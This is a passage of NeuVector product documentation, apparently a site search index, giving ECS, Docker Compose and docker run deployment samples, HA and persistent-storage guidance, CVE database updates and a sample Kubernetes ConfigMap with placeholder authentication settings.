&quot;ulimits&quot;: null, &quot;dockerSecurityOptions&quot;: null, &quot;environment&quot;: [ { &quot;name&quot;: &quot;CLUSTER_JOIN_ADDR&quot;, &quot;value&quot;: &quot;REPLACE: Private IP&quot; } ], &quot;links&quot;: null, &quot;workingDirectory&quot;: null, &quot;readonlyRootFilesystem&quot;: false, &quot;image&quot;: &quot;REPLACE: Image Path/Name&quot;, &quot;command&quot;: null, &quot;user&quot;: null, &quot;dockerLabels&quot;: { &quot;com.myself.name&quot;: &quot;neuvector&quot; }, &quot;logConfiguration&quot;: null, &quot;cpu&quot;: 0, &quot;privileged&quot;: true, &quot;memoryReservation&quot;: 512 } ], &quot;volumes&quot;: [ { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/lib/modules&quot; }, &quot;name&quot;: &quot;modules&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/var/run/docker.sock&quot; }, &quot;name&quot;: &quot;dockersock&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/proc&quot; }, &quot;name&quot;: &quot;proc&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/sys/fs/cgroup&quot; }, &quot;name&quot;: &quot;cgroup&quot; } ], &quot;family&quot;: &quot;my-enforcer&quot;, &quot;placementConstraints&quot;: [] }   ","version":"Next 🚧","tagName":"h3"},{"title":"Live Updating NeuVector​","type":1,"pageTitle":"Amazon ECS","url":"/next/deploying/ecs#live-updating-neuvector","content":" You can do a live update of the NeuVector containers in ECS without interrupting services. NeuVector’s services can be easily updated or upgraded without interrupting any running services. To do that in Amazon ECS:  If you have multiple controllers or Allinones deployed as a cluster, ignore this step. If there is only a single Allinone/controller in the system, find a new ECS instance and deploy a 2nd Allinone/controller container on it (follow the NeuVector allinone/controller ECS deployment steps). After deployed, in the NeuVector management console, you will see this new controller up and running (under Resources &gt; Controllers). This is required so that all stateful data is replicated between controllers. In ECS Services, reset and delete the old Allinone/controller service. Pull the updated NeuVector images manually or trigger AWS ECS to pull new versions of Allinone/controller containers from Dockerhub or your private registry. Create a new revision of the Allinone/Controller task, update the “CLUSTER_JOIN_ADDR” to the 2nd Allinone/controller’s private node IP address. Create a new service to deploy this new task (follow the same steps to deploy on ECS). After completed, the new version of the Allinone/controller should be up and running. From the NeuVector management console, all the logs and policies should still be there. Optionally, you can bring down the 2nd Allinone/Controller container now since there should be a Allinone/Controller now started on the original node. From ECS Services, shutdown and update the Enforcers. Manually or auto-trigger the pulling of new Enforcer images. Then restart or update the Enforcer on all nodes. From the NeuVector console, you will see all Enforcers are up to date. If you are using the separate Manager container instead of the Allinone (which already has the manager in it), simply shutdown and remove the old manager container. Then pull the new manager version, and deploy it, pointing the CLUSTER_JOIN_ADDR to the IP of the controller.  All NeuVector containers are now updated live. All policies, logs, and configurations are unaffected. The live graph view will be regenerated automatically as soon as there is new live traffic flowing between containers. ","version":"Next 🚧","tagName":"h3"},{"title":"Docker & Mirantis Kubernetes Engine","type":0,"sectionRef":"#","url":"/next/deploying/docker","content":"","keywords":"","version":"Next 🚧"},{"title":"Kubernetes Deployment on Mirantis Kubernetes Engine​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/next/deploying/docker#kubernetes-deployment-on-mirantis-kubernetes-engine","content":" Follow the instructions in the Kubernetes section.  note NeuVector does not support mixed Kubernetes / Swarm clusters.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy NeuVector Containers Using Docker Native or UCP/Swarm​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/next/deploying/docker#deploy-neuvector-containers-using-docker-native-or-ucpswarm","content":" Note that native Docker deployment on Mirantis Kubernetes Engine using Swarm DOES NOT support deployment of services with containers in privileged mode, or with seccomp capabilities added. To deploy in this environment, you must use Docker Compose or Run to deploy the NeuVector containers. You can use the remote host deployment (docker-compose -H HOST) to make this task easier.  Here are the sample docker compose configuration files. Note that using docker native does not support deploying the enforcer on the same node as the controller, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Note: The environment variable NV_PLATFORM_INFO=platform=Docker is used to notify NeuVector that the platform is Docker/Swarm, even though there may be unused Kubernetes containers detected by NeuVector on a Docker EE deployment. Also to be able to see these in Network Activity -&gt; View -&gt; Show System, add the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Deploy Allinone for High Availability​  For HA in production Docker native or EE environments, deploy the Allinone container on the first three production hosts. Each Allinone should point to the IP addresses of all Allinone hosts. For example, three Allinone containers is the minimum for HA, and the CLUSTER_JOIN_ADDR should list the three IP addresses separated by comma's. Additional HA Allinone's can be deployed in odd numbers, e.g. 5, 7. The deploy the Enforcer on the remaining hosts in the cluster, in any.  Deploy Allinone using docker-compose (privileged mode)​  The following is an example of the docker-compose file to deploy the allinone container on the first node. Because the allinone container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Note: To expose the REST API in the Allinone, add the port map for 10443, for example - 10443:10443.  Add an enforcer container using docker-compose (privileged mode)​  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  Deploy the NeuVector Scanner Container​  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning. Important: Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  Sample docker run to deploy the scanner on the same host as the controller  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   To deploy the scanner on a different host than the controller, add the environment variable CLUSTER_ADVERTISED_ADDR so the controller can reach the scanner.  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=scanner_host_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   To deploy multiple scanners on the same host as the controller, remove the port mapping and CLUSTER_ADVERTISED_ADDR environment variable.  docker run -itd --name s1 -e CLUSTER_JOIN_ADDR=controller_node_ip neuvector/scanner:latest   Where s1 is scanner 1 (use s2, s3 etc for each additional scanner).  To deploy a stand alone scanner (no controller/allinone), please see the section Parallel and Standalone Scanners.  To update the Scanner in order to get the latest CVE database updates from NeuVector, create a cron job to stop and restart the scanner, pulling the latest. See this section for details.  Deployment Without Using Privileged Mode​  For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmor profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.  Deploy allinone (NO privileged mode) with docker-compose​  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: neuvector.allinone cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Deploy enforcer (NO privileged mode) with docker-compose​  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: neuvector.enforcer cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   Deploy allinone (privileged mode) with docker run​  You can use docker run instead of compose to deploy. Here are samples.  docker run -d --name allinone \\ --pid=host \\ --privileged \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18300:18300 \\ -p 18301:18301 \\ -p 18400:18400 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -p 8443:8443 \\ -v /lib/modules:/lib/modules:ro \\ -v /var/neuvector:/var/neuvector \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/allinone:&lt;version&gt;   Deploy enforcer (privileged mode) with docker run​  docker run -d --name enforcer \\ --pid=host \\ --privileged \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18301:18301 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -v /lib/modules:/lib/modules:ro \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/enforcer:&lt;version&gt;   Deploy allinone (NO privileged mode) with docker run​  You can use docker run instead of compose to deploy. Here are samples.  docker run -d --name allinone \\ --pid=host \\ --cap-add=SYS_ADMIN \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_PTRACE \\ --cap-add=IPC_LOCK \\ --security-opt label=disable \\ --security-opt apparmor=unconfined \\ --security-opt seccomp=unconfined \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18300:18300 \\ -p 18301:18301 \\ -p 18400:18400 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -p 8443:8443 \\ -v /lib/modules:/lib/modules:ro \\ -v /var/neuvector:/var/neuvector \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/allinone:&lt;version&gt;   Deploy enforcer (NO privileged mode) with docker run​  docker run -d --name enforcer \\ --pid=host \\ --cap-add=SYS_ADMIN \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_PTRACE \\ --cap-add=IPC_LOCK \\ --security-opt label=disable \\ --security-opt apparmor=unconfined \\ --security-opt seccomp=unconfined \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18301:18301 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -v /lib/modules:/lib/modules:ro \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/enforcer:&lt;version&gt;   ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy Separate NeuVector Components on Different Hosts​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/next/deploying/docker#deploy-separate-neuvector-components-on-different-hosts","content":" If planning to dedicate a docker host to a Controller and/or Manager (no Enforcer) these containers can be deployed individually instead of the Allinone. Note that docker does not support deploying the enforcer on the same node as the controller as separate components, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Controller compose file (replace [controller IP] with IP of the first controller node)  controller: image: neuvector/controller:&lt;version&gt; container_name: controller pid: host privileged: true environment: - CLUSTER_JOIN_ADDR=[controller IP] - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 10443:10443 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Docker run can also be used, for example  docker run -itd --privileged --name neuvector.controller -e CLUSTER_JOIN_ADDR=controller_ip -p 18301:18301 -p 18301:18301/udp -p 18300:18300 -p 18400:18400 -p 10443:10443 -v /var/neuvector:/var/neuvector -v /var/run/docker.sock:/var/run/docker.sock:ro -v /proc:/host/proc:ro -v /sys/fs/cgroup/:/host/cgroup/:ro neuvector/controller:&lt;version&gt;   Manager compose file (replace [controller IP] with IP of controller node to connect to). The Docker UCP HRM service uses the default port 8443 which conflicts with the NeuVector console port. If using the default HRM port, then change the NeuVector port mapping in the example below to another port, for example 9443:8443 for the manager container as shown below.  manager: image: neuvector/manager:&lt;version&gt; container_name: nvmanager environment: - CTRL_SERVER_IP=[controller IP] ports: - 9443:8443   The compose file for the Enforcer:  enforcer: image: neuvector/enforcer:&lt;version&gt; pid: host container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   ","version":"Next 🚧","tagName":"h3"},{"title":"Monitoring and Restarting NeuVector​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/next/deploying/docker#monitoring-and-restarting-neuvector","content":" Since the NeuVector containers are not deployed as a UCP/Swarm service, they are not automatically started/restarted on nodes. You should set up alerting through your SIEM system for NeuVector SYSLOG events or through DataCenter to detect if a NeuVector container is not running.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploying Without Privileged Mode​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/next/deploying/docker#deploying-without-privileged-mode","content":" In general you’ll need to replace the privileged setting with:   cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable   The above syntax is for Docker EE v17.06.0+. Versions prior to this use the : instead of =, for example apparmor:unconfined.  ","version":"Next 🚧","tagName":"h3"},{"title":"Docker Native Updates​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/next/deploying/docker#docker-native-updates","content":" important Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  docker stop scanner docker rm &lt;scanner id&gt; docker pull neuvector/scanner:latest &lt;docker run command from below&gt;   note docker rm -f &lt;scanner id&gt; can also be used to force stop and removal of the running scanner. For docker-compose docker-compose -f file.yaml down docker-compose -f file.yaml pull // pre-pull the image before starting the scanner docker-compose -f file.yaml up -d Sample docker run docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=node_ip -e SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest And sample docker-compose Scanner: image: neuvector/scanner:latest container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip - CLUSTER_ADVERTISED_ADDR=node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploying NeuVector","type":0,"sectionRef":"#","url":"/next/deploying/production","content":"","keywords":"","version":"Next 🚧"},{"title":"Planning Deployments​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#planning-deployments","content":" The NeuVector containers in a default deployment include the controller, manager, enforcer, scanner, and updater. Placement of where these containers (on which nodes) are deployed must be considered, and appropriate labels, taints or tolerations created to control them.  The enforcer should be deployed on every host/node where application containers to be monitored and protected by NeuVector will be running.  The controller manages the cluster of enforcers, and can be deployed on the same node as an enforcer or on a separate management node. The manager should be deployed on the node where the controller is running, and will provide console access to the controller. Other required NeuVector containers such as the manager, scanner, and updater are described in more detail in the Best Practices guide referenced below.  If you haven’t done so, pull the images from the NeuVector Docker Hub.  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.3.0neuvector/controller:5.3.0neuvector/enforcer:5.3.0neuvector/scanner:latestneuvector/updater:latest  Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml:  Update the registry to docker.ioUpdate image names/tags to the current version on Docker Hub, as shown aboveLeave the imagePullSecrets empty  Best Practices, Tips, Q&amp;A for Deploying and Managing NeuVector​  Download and review this Deployment Best Practices document for tips such as performance and sizing, best practices, and frequently asked questions about deployments.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deployment Using Helm or Operators​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#deployment-using-helm-or-operators","content":" Automated deployment using Helm can be found at https://github.com/neuvector/neuvector-helm.  Deployment using an Operator, including RedHat Certified Operator and Kubernetes community operator is supported, with a general description here. The NeuVector RedHat operator is at https://access.redhat.com/containers/#/registry.connect.redhat.com/neuvector/neuvector-operator, and the community operator at https://operatorhub.io/operator/neuvector-operator.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deployment Using ConfigMap​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#deployment-using-configmap","content":" Automated deployment on Kubernetes is supported using a ConfigMap. Please see the Deploying Using ConfigMap section for more details.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploying the Controllers​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#deploying-the-controllers","content":" We recommend that multiple controllers be run for a high availability (HA) configuration. The controllers use the consensus based RAFT protocol to elect a leader and if the leader goes down, to elect another leader. Because of this, the number of active controllers should be an odd number, for example 3, 5, 7 etc.  ","version":"Next 🚧","tagName":"h3"},{"title":"Controller HA​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#controller-ha","content":" The controllers will synchronize all data between themselves, including configuration, policy, conversations, events, and notifications.  If the primary active controller goes down, a new leader will automatically be elected and take over.  Take special precautions to make sure there is always one controller running and ready, especially during host OS or orchestration platform updates and reboots.  ","version":"Next 🚧","tagName":"h3"},{"title":"Backups and Persistent Data​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#backups-and-persistent-data","content":" Be sure to periodically export the configuration file from the console and save it as a backup.  If you run multiple controllers in an HA configuration, as long as one controller is always up, all data will be synchronized between controllers.  If you wish to save logs such as violations, threats, vulnerabilities and events please enable the SYSLOG server in Settings.  NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/ from the controller pod. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  Persistent Volume Example​  The PersistentVolume defined in the cluster is required for persistent volume support. The requirement for NeuVector is that the accessModes needs to be ReadWriteMany(RWX). Not all storage types support the RWX access mode. For example, on GKE you may need to create a RWX persistent volume using NFS storage.  Once the PersistentVolume is created, there needs to be created a PersistentVolumeClaim as below for Controller. Currently the persistent volume is used only for the NeuVector configuration backup files in the controller (Policies, Rules, user data, integrations etc) and registry scan results.  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector spec: accessModes: - ReadWriteMany volumeMode: Filesystem resources: requests: storage: 1Gi   Here is an example for IBM Cloud:  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector labels: billingType: &quot;hourly&quot; region: us-south zone: sjc03 spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi iops: &quot;100&quot; storageClassName: ibmc-file-retain-custom   After the Persistent Volume Claim is created, modify the NeuVector sample yaml file as shown below (old section commented out):  ... spec: template: spec: volumes: - name: nv-share # hostPath: // replaced by persistentVolumeClaim # path: /var/neuvector // replaced by persistentVolumeClaim persistentVolumeClaim: claimName: neuvector-data   Also add the following environment variable in the Controller or Allinone sample yamls for persistent volume support. This will make the Controller read the backup config when starting.   - name: CTRL_PERSIST_CONFIG   ConfigMaps and Persistent Storage​  Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage.  For more information see the ConfigMaps section.  ","version":"Next 🚧","tagName":"h3"},{"title":"Updating CVE Vulnerability Database in Production​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#updating-cve-vulnerability-database-in-production","content":" Please see each sample section for instructions on how to keep the CVE database updated.  The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the Updater container image.  docker inspect neuvector/updater   &quot;Labels&quot;: { &quot;neuvector.image&quot;: &quot;neuvector/updater&quot;, &quot;neuvector.role&quot;: &quot;updater&quot;, &quot;neuvector.vuln_db&quot;: &quot;1.255&quot; }   After running the update, inspect the controller/allinone logs for 'version.' For example in Kubernetes:  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector | grep version ... 2019-07-29T17:04:02.43 |DEBU|SCN|main.dbUpdate: New DB found - create=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:02.454|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:12.224|DEBU|SCN|main.scannerRegister: - version=1.576   ","version":"Next 🚧","tagName":"h3"},{"title":"Accessing the Console​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#accessing-the-console","content":" By default the console is exposed as a service on port 8443, or nodePort with a random port on each host. Please see the first section Basics -&gt; Connect to Manager for options for turning off HTTPS or accessing the console through a corporate firewall which does not allow port 8443 for the console access.  ","version":"Next 🚧","tagName":"h3"},{"title":"Handing Host Updates or Auto-Scaling Nodes with a Pod Disruption Budget​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#handing-host-updates-or-auto-scaling-nodes-with-a-pod-disruption-budget","content":" Maintenance or scaling activities can affect the controllers on nodes. Public cloud providers support the ability to auto-scale nodes, which can dynamically evict pods including the NeuVector controllers. To prevent disruptions to the controllers, a NeuVector pod disruption budget can be created.  For example, create the file below nv_pdb.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   Then  kubectl create -f nv_pdb.yaml   For more details: https://kubernetes.io/docs/tasks/run-application/configure-pdb/  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy Without Privileged Mode​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#deploy-without-privileged-mode","content":" On some systems, deployment without using privileged mode is supported. These systems must support seccom capabilities and setting the apparmor profile.  See the section on Docker deployment for sample compose files.  ","version":"Next 🚧","tagName":"h3"},{"title":"Multi-site, Multi-Cluster Architecture​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#multi-site-multi-cluster-architecture","content":" For enterprises with multiple locations and where a separate NeuVector cluster can be deployed for each location, the following is a proposed reference architecture. Each cluster has its own set of controllers and is separately managed.    See a more detailed description in this file &gt;NeuVector Multi-Site Architecture ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy Using ConfigMap","type":0,"sectionRef":"#","url":"/next/deploying/production/configmap","content":"","keywords":"","version":"Next 🚧"},{"title":"Kubernetes ConfigMap​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/next/deploying/production/configmap#kubernetes-configmap","content":" NeuVector supports automated configuration using the Kubernetes ConfigMap feature. This enables deployment of NeuVector containers with the appropriate configurations, integrations, and other settings in an automated way.  The 'always_reload: true' setting can be added in any ConfigMap yaml to force reload of that yaml every time the controller starts (version 4.3.2+). Otherwise, the ConfigMap will only be loaded at initial startup or after complete cluster restart (see persistent storage section below).  Complete Sample NeuVector ConfigMap (initcfg.yaml)​  The latest ConfigMap can be found here.  The sample is also shown below. This contains all the settings available. Please remove the sections not needed and edit the sections needed. Note: If using configmap in a secret, see section below for formatting changes.  apiVersion: v1 data: passwordprofileinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false active_profile_name: default pwd_profiles: # only default profile is supported. - name: default comment: default from configMap min_len: 6 min_uppercase_count: 0 min_lowercase_count: 0 min_digit_count: 0 min_special_count: 0 enable_block_after_failed_login: false block_after_failed_login_count: 0 block_minutes: 0 enable_password_expiration: false password_expire_after_days: 0 enable_password_history: false password_keep_history_count: 0 # Optional. value between 30 -- 3600 default 300 session_timeout: 300 roleinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false roles: # Optional. - Comment: test role # Mandatory. name can have ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$ Name: testrole # Mandatory Permissions: - id: config read: true write: true - id: rt_scan read: true write: true - id: reg_scan read: true write: true - id: ci_scan write: true - id: rt_policy read: true write: true - id: admctrl read: true write: true - id: compliance read: true write: true - id: audit_events read: true - id: security_events read: true - id: events read: true - id: authentication read: true write: true - id: authorization read: true write: true ldapinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory. OpenLDAP or MicrosoftAD directory: OpenLDAP # Mandatory. Hostname: 1.2.3.4 # Optional. the default value is 389 Port: 389 # Optional true or false or empty string(false) SSL: false # Mandatory. base_dn: cn=admin,dc=example,dc=org # Optional. bind_dn: dc=example,dc=org # Optional. bind_password: password # Optional. empty string(memberUid for openldap or member for windows ad) group_member_attr: # Optional. empty string(cn for openldap or sAMAccountName for windows ad) username_attr: # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 oidcinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory Issuer: https://... # Mandatory Client_ID: f53c56ec... # Mandatory Client_Secret: AyAixE3... # Optional. empty or string(group filter info) GroupClaim: # Optional. empty string(openid,profile,email) Scopes: - openid - profile - email # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - custom-admin1 - custom-admin2 group_claim: groups samlinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Mandatory SSO_URL: https://... # Mandatory Issuer: https://... # Mandatory X509_Cert: | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- x509_cert_extra: - | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- # Optional. empty or string(group filter info) GroupClaim: # Optional. true or false or empty string(false) Enable: false # Optional. admin or reader or empty string(none) Default_Role: admin group_mapped_roles: - group: admin1 global_role: admin - group: reader1 global_role: reader - group: cipos1 global_role: ciops - group: admin2 global_role: admin - group: reader2 global_role: reader - group: ciops2 global_role: ciops - group: ns global_role: role_domains: testrole: - ns2-ciops1 - ns2-ciops2 reader: - ns2-reader1 - ns2-reader2 admin: - ns2-admin1 - ns2-admin2 - group: custom global_role: testrole role_domains: ciops: - custom-ciops1 - custom-ciops2 reader: - custom-reader1 - custom-reader2 admin: - 